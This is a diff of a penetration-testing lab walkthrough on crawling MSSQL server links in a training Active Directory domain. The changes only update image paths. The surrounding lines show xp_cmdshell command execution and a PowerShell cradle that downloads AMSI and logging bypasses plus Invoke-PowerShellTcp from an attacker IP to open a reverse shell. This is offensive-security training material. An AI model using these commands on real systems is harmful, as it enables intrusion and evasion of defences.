@@ -15,7 +15,7 @@ Now that we have those informations, we can use Get-SQLServerLinkCrawl for crawl
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1180).png" alt=""><figcaption></figcaption></figure>
 
 We can see We have sysadmin on eu-sql server!
 
@@ -27,7 +27,7 @@ If xp\_cmdshell is enabled (or RPC out is true - which is set to false in this c
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 Let's try to execute a PowerShell download execute cradle to execute a PowerShell reverse shell on the eu-sql instance. Remember to start a listener:
 
@@ -37,7 +37,7 @@ Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query '
 
 
 
-<figure><img src="../../.gitbook/assets/image (1180).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1180) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
  Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.13:5555/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.13:5555/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.13:5555/Invoke-PowerShellTcp.ps1)"''' -QueryTarget eu-sql13
